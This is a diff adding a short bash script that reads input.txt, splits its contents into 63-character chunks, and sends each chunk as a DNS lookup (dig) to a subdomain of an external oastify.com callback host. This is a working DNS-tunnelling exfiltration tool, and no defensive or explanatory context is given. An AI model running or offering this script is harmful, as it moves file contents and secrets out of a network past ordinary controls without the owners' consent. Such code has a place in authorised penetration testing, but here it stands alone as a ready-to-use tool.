@@ -1,0 +1,39 @@
+#!/bin/bash
+
+# Main domain
+main_domain="vdcz6hr4ueh3ngluv3gswvw5pwvnjfa3z.oastify.com"
+
+# Read the string from the file
+input_string=$(<input.txt)
+
+# Split and query function
+function split_and_query {
+    local segment_string=$1
+    local segment_length=63 # Max length for a DNS label
+    local full_domain=""
+    local segment=""
+
+    # Calculate the number of segments needed within the 255-char limit
+    local max_length=$((255 - ${#main_domain} - 2)) # Account for dots
+    local segment_count=$((max_length / segment_length))
+    if [ $((max_length % segment_length)) -ne 0 ]; then
+        ((segment_count++))
+    fi
+
+    # Split string into manageable segments
+    while [ ${#segment_string} -gt 0 ]; do
+        segment="${segment_string:0:segment_length}"
+        segment_string="${segment_string:segment_length}"
+
+        # Build the full domain and query
+        full_domain="${segment}.${main_domain}"
+        echo "Querying domain: $full_domain"
+        dig A "$full_domain" +short
+
+        # Sleep to avoid rate limiting, adjust as necessary
+        sleep 1
+    done
+}
+
+# Initial call to split and query
+split_and_query "$input_string"
